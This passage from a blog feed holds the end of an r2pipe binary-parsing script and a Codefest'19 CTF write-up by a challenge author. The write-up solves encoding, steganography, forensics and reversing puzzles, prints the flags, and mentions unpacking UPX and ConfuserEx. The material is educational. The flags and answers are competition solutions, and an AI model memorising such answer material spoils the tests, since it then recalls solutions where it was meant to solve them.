&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; sys

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt;):  
    &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;elfs/{0:03}&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(i))  
    b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; r2pipe&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;elfs/{0:03}&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(i) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.c.out&amp;#39;&lt;/span&gt;)

    disass &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; b&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;cmd(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;aaa; s main; pdd&amp;#39;&lt;/span&gt;)  
    field &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; disass&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;eax = *(obj.&amp;#34;&lt;/span&gt;)[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;][&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]  
    byte &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; disass&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(f&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;*(obj.{field}) = &amp;#39;&lt;/span&gt;)[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;][&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;]  
    &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(binascii&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;unhexlify(byte)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ascii&amp;#39;&lt;/span&gt;), sep&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This is all. Thanks for reading!&lt;/p&gt;
&lt;p&gt;Follow me on &lt;a href=&#34;https://twitter.com/shreyansh_26&#34;&gt;Twitter&lt;/a&gt;, &lt;a href=&#34;https://github.com/shreyansh26&#34;&gt;Github&lt;/a&gt; or connect on &lt;a href=&#34;https://www.linkedin.com/in/shreyansh26/&#34;&gt;LinkedIn&lt;/a&gt;.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Codefest’19 CTF Writeups</title>
      <link>https://shreyansh26.github.io/post/2019-08-25_codefest19-ctf-writeups/</link>
      <pubDate>Sun, 25 Aug 2019 19:13:05 +0000</pubDate>
      <guid>https://shreyansh26.github.io/post/2019-08-25_codefest19-ctf-writeups/</guid>
      <description>&lt;p&gt;The Capture the Flag event for &lt;a href=&#34;http://codefest.tech&#34;&gt;Codefest’19&lt;/a&gt; was hosted from 8 pm, 23rd August 2019 to 12 noon, 24th August 2019 on Hackerrank.&lt;/p&gt;
&lt;p&gt;The contest link can be found &lt;a href=&#34;https://www.hackerrank.com/codefest19-ctf&#34;&gt;here&lt;/a&gt;. There were a total of &lt;strong&gt;1532&lt;/strong&gt; registrations and &lt;strong&gt;518&lt;/strong&gt; people who were successful in solving atleast one challenge.&lt;/p&gt;
&lt;p&gt;So, onto the writeups.&lt;/p&gt;
&lt;h3 id=&#34;welcome-to-codefest-19-intro-challenge100pts&#34;&gt;&lt;strong&gt;Welcome to Codefest 19! (Intro Challenge — 100pts)&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;This was the introductory challenge. I had tried to make it a bit difficult than the normal introductory challenges, but I felt that it proved to be a bit difficult for the beginners.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/13.png&#34; data-caption=&#34;The challenge&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/13.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    The challenge
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;Here, first you had to join the telegram group linked in the proble. There you got the first half of the flag — **CodefestCTF{G3t_r3ady_**. For the other half there was a pinned message on the group.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The other half of the flag was uploaded on the contest page yesterday by accident. It has now been removed. Can you find it?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;For this you had to use &lt;a href=&#34;http://archive.org&#34;&gt;archive.org,&lt;/a&gt; there was a snapshot of the contest page created on 23rd Aug 2019. Viewing the &lt;a href=&#34;https://web.archive.org/web/20190823133528/https://www.hackerrank.com/codefest19-ctf&#34;&gt;snapshot&lt;/a&gt; got you the second half of the flag —&lt;strong&gt;f0r_C0def3stCTF-8fb34fjr4bs43ur8}&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;So, the final flag is — &lt;strong&gt;CodefestCTF{G3t_r3ady_f0r_C0def3stCTF-8fb34fjr4bs43ur8}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h3 id=&#34;what-language-is-this-misc100pts&#34;&gt;What language is this? (Misc — 100pts)&lt;/h3&gt;
&lt;p&gt;This was basically a esoteric language question. The given text was —&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;iiisdsiiioiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiodddddddddddoioiodoiiiiiiiiiiiiiioiodddddddddddddddddddddddddddddddddddddddddddddddddoiiiiiiiiiiiiiiiiioddddddddddddddoiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiioddddddddddddddddddddddddddddddddddddoiiiiiiiiiiiiiioiiiiiiiodddddddddodddddddddddddddddddddddddddddddddddddddddddddddddddoddddddddddddddddddddddddddddddddddddddsiiiiiiiiioddddddddoddddddoiiiiiiiiiiiiiiiiiiiiioddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddoddddddddddddddddddddddddddddddddsiiisisdddddoddddddddddddddddddddddddddddodddddddddddddddddddoddddddddddddddddddddddddddddddddsiiisisoioiodoiiiiiiiiiiiiiioiodddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddoiiiiiiiioddddddddddddddddddddddddddddddddddddddddddddddsiiiio
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The language was &lt;a href=&#34;https://esolangs.org/wiki/Deadfish&#34;&gt;Deadfish&lt;/a&gt;. You could use an online decoder for that language, something like &lt;a href=&#34;https://www.dcode.fr/deadfish-language&#34;&gt;this&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The final flag was — &lt;strong&gt;CodefestCTF{Welc0me_t0_C0defest19}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h3 id=&#34;gibberish-file-misc100pts&#34;&gt;Gibberish file (Misc — 100pts)&lt;/h3&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-08-25_codefest19-ctf-writeups/images/2.png&#34; data-caption=&#34;The challenge&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-08-25_codefest19-ctf-writeups/images/2.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    The challenge
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;The hint was in the problem statement. You had to reverse the file to find the flag. A simple one-line script could do it&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;output2.txt&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;wb&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;output.txt&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rb&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()[::&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;])
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The resulting had some text like&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;𝝩𝗵𝙚 𝗳𝒍𝙖𝗴 𝒊𝙨 𝐋𝒊𝐓𝚬𝐫𝚨𝐋﹏𝕽𝜠𝓥Ｅℜ𝕊𝐢𝙣𝓖ꓸ 𝝩𝗵𝙚 𝗳𝒍𝙖𝗴 𝒊𝙨 𝐋𝒊𝐓𝚬𝐫𝚨𝐋﹏𝕽𝜠𝓥Ｅℜ𝕊𝐢𝙣𝓖ꓸ 𝝩𝗵𝙚 𝗳𝒍𝙖𝗴 𝒊𝙨 𝐋𝒊𝐓𝚬𝐫𝚨𝐋﹏𝕽𝜠𝓥Ｅℜ𝕊𝐢𝙣𝓖ꓸ 𝝩𝗵𝙚 𝗳𝒍𝙖𝗴 𝒊𝙨 𝐋𝒊𝐓𝚬𝐫𝚨𝐋﹏𝕽𝜠𝓥Ｅℜ𝕊𝐢𝙣𝓖ꓸ 𝝩𝗵𝙚 𝗳𝒍𝙖𝗴 𝒊𝙨 𝐋𝒊𝐓𝚬𝐫𝚨𝐋﹏𝕽𝜠𝓥Ｅℜ𝕊𝐢𝙣𝓖ꓸ 𝝩𝗵𝙚 𝗳𝒍𝙖𝗴 𝒊𝙨 𝐋𝒊𝐓𝚬𝐫𝚨𝐋﹏𝕽𝜠𝓥Ｅℜ𝕊𝐢𝙣𝓖ꓸ 𝝩𝗵𝙚 𝗳𝒍𝙖𝗴 𝒊𝙨 𝐋𝒊𝐓𝚬𝐫𝚨𝐋﹏𝕽𝜠𝓥Ｅℜ𝕊𝐢𝙣𝓖ꓸ 𝝩𝗵𝙚 𝗳𝒍𝙖𝗴 𝒊𝙨 𝐋𝒊𝐓𝚬𝐫𝚨𝐋﹏𝕽𝜠𝓥Ｅℜ𝕊𝐢𝙣𝓖ꓸ 𝝩𝗵𝙚 𝗳𝒍𝙖𝗴 𝒊𝙨 𝐋𝒊𝐓𝚬𝐫𝚨𝐋﹏𝕽𝜠𝓥Ｅℜ𝕊𝐢𝙣𝓖ꓸ 𝝩𝗵𝙚 𝗳𝒍𝙖𝗴 𝒊𝙨 𝐋𝒊𝐓𝚬𝐫𝚨𝐋﹏𝕽𝜠𝓥Ｅℜ𝕊𝐢𝙣𝓖ꓸ 𝝩𝗵𝙚 𝗳𝒍𝙖𝗴 𝒊𝙨 𝐋𝒊𝐓𝚬𝐫𝚨𝐋﹏𝕽𝜠𝓥Ｅℜ𝕊𝐢𝙣𝓖ꓸ 𝝩𝗵𝙚 𝗳𝒍𝙖𝗴 𝒊𝙨 𝐋𝒊𝐓𝚬𝐫𝚨𝐋﹏𝕽𝜠𝓥Ｅℜ𝕊𝐢𝙣𝓖ꓸ 𝝩𝗵𝙚 𝗳𝒍𝙖𝗴 𝒊𝙨 𝐋𝒊𝐓𝚬𝐫𝚨𝐋﹏𝕽𝜠𝓥Ｅℜ𝕊𝐢𝙣𝓖ꓸ 𝝩𝗵𝙚 𝗳𝒍𝙖𝗴 𝒊𝙨 𝐋𝒊𝐓𝚬𝐫𝚨𝐋﹏𝕽𝜠𝓥Ｅℜ𝕊𝐢𝙣𝓖ꓸ 𝝩𝗵𝙚 𝗳𝒍𝙖𝗴 𝒊𝙨 𝐋𝒊𝐓𝚬𝐫𝚨𝐋﹏𝕽𝜠𝓥Ｅℜ𝕊𝐢𝙣𝓖ꓸ&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The flag was the ASCII analog of each unicode character.&lt;/p&gt;
&lt;p&gt;The flag was — &lt;strong&gt;CodefestCTF{LiTErAL_REVERSinG}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h3 id=&#34;image-corruption-forensics100pts&#34;&gt;Image Corruption (Forensics — 100pts)&lt;/h3&gt;
&lt;p&gt;In the challenge, you were given a link to a corrupted &lt;em&gt;.bmp&lt;/em&gt; &lt;a href=&#34;https://drive.google.com/file/d/1t5d_lKkdoG1aicBJYhM8wqh7Ispk0G4U/view&#34;&gt;file&lt;/a&gt;. On viewing the file in a hex editor, and also checking the magic bytes —&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-08-25_codefest19-ctf-writeups/images/3.png&#34; data-caption=&#34;Hex view of the image&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-08-25_codefest19-ctf-writeups/images/3.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Hex view of the image
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;We know there is something to do with “matrix”. Also for a normal &lt;em&gt;.bmp&lt;/em&gt; file the initial magic bytes are 424d 8a44 1300. XORing this with the first six bytes of the given file also gives you “matrix”. So to solve the challenge, we XOR the whole image with “matrix”.&lt;/p&gt;
&lt;script type=&#34;application/javascript&#34; src=&#34;https://gist.github.com/shreyansh26/391d4103c8175cd3484c286d7c51dfd7.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;Run the script, and you obtain the correct file.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-08-25_codefest19-ctf-writeups/images/4.jpeg&#34; data-caption=&#34;The correct file&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-08-25_codefest19-ctf-writeups/images/4.jpeg&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    The correct file
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;The flag is — &lt;strong&gt;CodefestCTF{f1l35_h4v3_m461c_by735}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h3 id=&#34;mail-capture-steganography-100pts&#34;&gt;Mail capture (Steganography— 100pts)&lt;/h3&gt;
&lt;p&gt;You are presented with a “email friendly text”. This was encoded to unicode by a tool called &lt;strong&gt;uuencode&lt;/strong&gt;. It can be decoded by using &lt;strong&gt;uudecode&lt;/strong&gt;, a decoder for such formats. Running &lt;strong&gt;uudecode&lt;/strong&gt; with the file gives an output file called “flag_encoded”. The contents are the flag — &lt;strong&gt;CodefestCTF{7h15_15_4_c001_3nc0d1n9}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h3 id=&#34;cats-are-innocent-right-steganography-500pts&#34;&gt;Cats are innocent, right? (Steganography— 500pts)&lt;/h3&gt;
&lt;p&gt;This challenge was based on LSB steganography. I had used a tool called &lt;a href=&#34;https://github.com/DimitarPetrov/stegify&#34;&gt;&lt;strong&gt;stegify&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The challenge image -&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-08-25_codefest19-ctf-writeups/images/5.jpeg&#34; data-caption=&#34;Challenge image&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-08-25_codefest19-ctf-writeups/images/5.jpeg&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Challenge image
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;On running the command -&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;stegify -op decode -carrier cute_kittens.jpg -result hello&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We get a &lt;em&gt;hello.zip&lt;/em&gt; file which was embedded in the LSBs of the image. The zip file had a file inside it but that was of no use. The flag was appended at the end of the zip file.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-08-25_codefest19-ctf-writeups/images/6.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-08-25_codefest19-ctf-writeups/images/6.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;The flag is appended at the end of the zip file&lt;/p&gt;
&lt;p&gt;The flag is — &lt;strong&gt;CodefestCTF{h1d1ng_b3h1nd_1nn0c3nt_k1tt3n5}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h3 id=&#34;weird-encoding-misc-200pts&#34;&gt;Weird encoding (Misc— 200pts)&lt;/h3&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-08-25_codefest19-ctf-writeups/images/7.png&#34; data-caption=&#34;The challenge&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-08-25_codefest19-ctf-writeups/images/7.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    The challenge
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;We are given the following “encoding”&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0x85+1x1+0x14
0x7+1x1+0x7+1x1+0x9+1x2+0x3+1x4+0x3+1x1+0x6+1x5+0x1+1x1+0x2+1x1+0x1+1x2+0x13+1x2+0x3+1x1+0x8+1x1+0x5+1x2+0x8
0x1+1x5+0x18+1x3+0x3+1x1+0x16+1x2+0x1+1x1+0x5+1x2+0x2+1x1+0x3+1x1+0x4+1x2+0x3+1x3+0x3+1x1+0x2+1x2+0x4+1x3+0x8
0x3+1x1+0x7+1x1+0x11+1x2+0x1+1x1+0x3+1x5+0x12+1x1+0x2+1x1+0x7+1x1+0x10+1x1+0x3+1x2+0x1+1x1+0x5+1x3+0x4+1x1+0x1+1x2+0x2+1x1+0x4
0x3+1x1+0x3+1x1+0x7+1x2+0x3+1x1+0x2+1x1+0x2+1x1+0x7+1x1+0x11+1x2+0x2+1x2+0x5+1x2+0x10+1x1+0x3+1x1+0x2+1x1+0x3+1x2+0x2+1x1+0x4+1x4+0x7
0x3+1x1+0x3+1x1+0x3+1x1+0x1+1x3+0x10+1x1+0x7+1x1+0x7+1x1+0x3+1x1+0x3+1x1+0x1+1x2+0x2+1x3+0x8+1x5+0x4+1x1+0x3+1x9+0x1+1x3+0x7
0x3+1x1+0x3+1x3+0x1+1x1+0x1+1x4+0x9+1x1+0x6+1x2+0x2+1x1+0x7+1x2+0x3+1x1+0x2+1x1+0x4+1x1+0x10+1x1+0x6+1x1+0x7+1x1+0x7+1x4+0x4
0x5+1x1+0x1+1x1+0x1+1x1+0x1+1x1+0x4+1x2+0x7+1x2+0x3+1x4+0x11+1x1+0x4+1x1+0x2+1x1+0x3+1x2+0x6+1x1+0x3+1x1+0x6+1x1+0x7+1x1+0x1+1x1+0x1+1x5+0x7
0x7+1x1+0x1+1x1+0x1+1x1+0x2+1x3+0x7+1x5+0x16+1x1+0x4+1x1+0x2+1x1+0x1+1x3+0x3+1x6+0x2+1x1+0x2+1x1+0x1+1x5+0x5+1x1+0x2+1x1+0x4+1x1+0x7
0x18+1x5+0x13+1x6+0x27+1x1+0x14+1x1+0x2+1x2+0x2+1x1+0x5+1x1+0x2
0x1+1x1+0x5+1x1+0x4+1x1+0x3+1x1+0x8+1x1+0x8+1x1+0x9+1x1+0x8+1x1+0x5+1x1+0x17+1x1+0x10+1x3+0x9
0x68+1x1+0x11+1x1+0x19

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here a bit of observation was required to figure out that the “x” symbol mean concatenation &lt;em&gt;n&lt;/em&gt; number of a character, like 0x5 will mean 00000. And “+” would mean concatenation of two strings of different type. Also, one will also have to decide on 0 representing 255 255 255 i.e. the color &lt;em&gt;white&lt;/em&gt; and 1 representing 0 0 0 , i.e. the color &lt;em&gt;black&lt;/em&gt;. You could have experimented with both combinations but eventually you would get the correct mapping.&lt;/p&gt;
&lt;p&gt;The following script can help generate the image.&lt;/p&gt;
&lt;script type=&#34;application/javascript&#34; src=&#34;https://gist.github.com/shreyansh26/9f262ca29ec6bcb5c8b66e1feb95cf6e.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;The obtained image is this -&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-08-25_codefest19-ctf-writeups/images/8.png&#34; data-caption=&#34;You may want to zoom in a bit&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-08-25_codefest19-ctf-writeups/images/8.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    You may want to zoom in a bit
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;The flag is — &lt;strong&gt;CodefestCTF{This_15_7h3_f14g}&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h3 id=&#34;linux-re-1-reversing300pts&#34;&gt;Linux RE 1 (Reversing — 300pts)&lt;/h3&gt;
&lt;p&gt;This challenge was a bit difficult to solve using a debugger due to some anti-debugging techniques that were implemented. Also, initially the ELF was packed using UPX, which was visible as a string when you would have run the &lt;strong&gt;strings&lt;/strong&gt; command. So, first use&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;upx -d&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;with the ELF to decompress it.&lt;/p&gt;
&lt;p&gt;For the next part, You could use a disassembler or a decompiler to get the source code and eventually reverse the binary. The executable was generated from a C++ file hence it was a bit messy to view in a decompiler.&lt;/p&gt;
&lt;p&gt;The decompiled view (using Ghidra) of the main function (the interesting part) is the following -&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-08-25_codefest19-ctf-writeups/images/9.png&#34; data-caption=&#34;Decompiled main function&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-08-25_codefest19-ctf-writeups/images/9.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Decompiled main function
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;The &lt;em&gt;key_int&lt;/em&gt; and &lt;em&gt;enc_int&lt;/em&gt; are global variables. The main logic of the ELF is in the &lt;strong&gt;rahasya&lt;/strong&gt; function.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-08-25_codefest19-ctf-writeups/images/10.png&#34; data-caption=&#34;Decompiled rahasya function&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-08-25_codefest19-ctf-writeups/images/10.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Decompiled rahasya function
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;This basically takes two strings and XORs them and returns the XORd string. The two strings it takes as input are the user input and the &lt;em&gt;key_int&lt;/em&gt; string. The XORd data is matched with the &lt;em&gt;enc_int&lt;/em&gt; data.&lt;/p&gt;
&lt;p&gt;So, basically to reverse the binary you have to XOR both the &lt;em&gt;key_int&lt;/em&gt; and &lt;em&gt;enc_int&lt;/em&gt; data.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-08-25_codefest19-ctf-writeups/images/11.png&#34; data-caption=&#34;enc_int data&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-08-25_codefest19-ctf-writeups/images/11.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    enc_int data
  &lt;/figcaption&gt;


&lt;/figure&gt;














&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-08-25_codefest19-ctf-writeups/images/12.png&#34; data-caption=&#34;key_int data&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-08-25_codefest19-ctf-writeups/images/12.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    key_int data
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;Basically,&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;int &lt;em&gt;enc_int[]&lt;/em&gt; = {80, 93, 3, 67, 3, 86, 11, 110, 64, 2, 90, 27, 84, 28, 110, 75, 3, 69, 52, 6, 11, 5, 80, 88, 90, 88};&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;int &lt;em&gt;key_int[]&lt;/em&gt; = {49, 51, 51, 55, 107, 101, 121};&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;XOR both of them, and you get &lt;em&gt;an0th3r_s1mp1e_x0r_cr4ckm3&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;So, the flag is &lt;strong&gt;CodefestCTF{an0th3r_s1mp1e_x0r_cr4ckm3}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h3 id=&#34;linux-re-2-reversing500pts&#34;&gt;Linux RE 2 (Reversing — 500pts)&lt;/h3&gt;
&lt;p&gt;Again we open the file in IDA or any disassembler and/or decompiler we see that the input should satisfy a set of conditions on the letters of the input.&lt;/p&gt;
&lt;p&gt;The conditions can be translated as&lt;/p&gt;
&lt;script type=&#34;application/javascript&#34; src=&#34;https://gist.github.com/shreyansh26/c0c225fa5daa05da85bb0534dc5438a9.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;We can use some kind of SMT solver like z3 to find the password.&lt;/p&gt;
&lt;script type=&#34;application/javascript&#34; src=&#34;https://gist.github.com/shreyansh26/bccc43909e68ddd7d219f59fc48da4c5.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;The obtained password is — &lt;em&gt;shouldve_used_some_tool&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;The flag, hence, is &lt;strong&gt;CodefestCTF{shouldve_used_some_tool}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h3 id=&#34;windows-re-reversing500pts&#34;&gt;Windows RE (Reversing — 500pts)&lt;/h3&gt;
&lt;p&gt;In this problem, the Windows exe file (actually a .NET file) that was provided, was packed with &lt;a href=&#34;https://yck1509.github.io/ConfuserEx/&#34;&gt;ConfuserEx&lt;/a&gt;. We can use &lt;a href=&#34;https://github.com/CodeShark-Dev/NoFuserEx&#34;&gt;NoFuserEx,&lt;/a&gt; which is a free deobfuscator for this packer.&lt;/p&gt;
&lt;p&gt;Then, open the executable in any .NET decompiler like dnSpy and check the &lt;strong&gt;Form&lt;/strong&gt; function to get the password as well as the flag.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Password — thisisa1337password&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The flag — &lt;strong&gt;CodefestCTF{51mp13_1npu7_v411d4710n_8u7_w17h_4_7w157}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h3 id=&#34;no-fatshaming-web600pts&#34;&gt;No Fatshaming (Web — 600pts)&lt;/h3&gt;
&lt;p&gt;I’ll cheat a bit here xD. You can read my friend Yashit’s &lt;a href=&#34;https://medium.com/@yashitmaheshwary/no-fatshaming-web-challenge-writeup-codefest19-ctf-1deea5a2ea49&#34;&gt;awesome writeup&lt;/a&gt; on the challenge.&lt;/p&gt;
&lt;p&gt;Flag is — &lt;strong&gt;CodefestCTF{1AmTeHHHAX00Rr4uj8rfi4e$%y5yhrf}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Hope you had a great time solving the challenges and that it was a good learning experience for beginners.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Follow me on &lt;a href=&#34;https://twitter.com/shreyansh_26&#34;&gt;Twitter&lt;/a&gt;, &lt;a href=&#34;https://github.com/shreyansh26&#34;&gt;Github&lt;/a&gt; or connect on &lt;a href=&#34;https://www.linkedin.com/in/shreyansh26/&#34;&gt;LinkedIn&lt;/a&gt;.&lt;/p&gt;
